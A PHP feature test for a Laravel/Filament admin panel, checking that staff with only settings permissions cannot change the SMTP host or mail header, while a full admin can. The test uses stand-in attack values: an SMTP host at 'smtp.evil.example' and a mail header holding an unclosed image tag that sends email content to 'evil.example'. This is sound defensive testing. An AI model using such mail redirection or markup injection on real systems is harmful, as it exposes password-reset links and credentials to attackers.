<?php

namespace Tests\Feature;

use App\Admin\Pages\Settings;
use App\Models\Role;
use App\Models\Setting;
use App\Models\Staff;
use Filament\Facades\Filament;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Audit 2026-11-18 (review of #911): every reset link and welcome password goes through the SMTP server and inside the
 * mail header, footer and CSS. Staff with «settings» alone see them, never change them: a full admin's.
 */
class MailSettingsFullAdminTest extends TestCase
{
    use RefreshDatabase;

    private function stored(string $key): ?string
    {
        return Setting::query()->where('key', $key)->whereNull('settingable_type')->value('value');
    }

    public function test_staff_with_settings_alone_cannot_repoint_the_mail_or_wrap_it(): void
    {
        Filament::setCurrentPanel(Filament::getPanel('admin'));
        $settings = Staff::factory()->create(['role_id' => Role::create(['name' => 'Settings', 'permissions' => ['admin.settings.view', 'admin.settings.update']])->id]);
        $before = ['mail_host' => $this->stored('mail_host'), 'mail_header' => $this->stored('mail_header')];

        $this->livewireAs($settings)->test(Settings::class)
            ->set('data.system_email_address', 'billing@example.test')
            ->set('data.mail_host', 'smtp.evil.example')
            ->set('data.mail_header', "<img src='https://evil.example/x?")
            ->call('save');

        $this->assertSame($before['mail_host'], $this->stored('mail_host'));
        $this->assertSame($before['mail_header'], $this->stored('mail_header'));
        $this->assertSame('billing@example.test', $this->stored('system_email_address'), 'the rest of the page still saves');
    }

    public function test_a_full_admin_changes_them(): void
    {
        Filament::setCurrentPanel(Filament::getPanel('admin'));
        $owner = Staff::factory()->create(['role_id' => Role::create(['name' => 'Owner', 'permissions' => ['*']])->id]);

        $this->livewireAs($owner)->test(Settings::class)
            ->set('data.system_email_address', 'billing@example.test')
            ->set('data.mail_footer', 'Thanks')
            ->call('save')->assertHasNoErrors();

        $this->assertSame('Thanks', $this->stored('mail_footer'));
    }
}
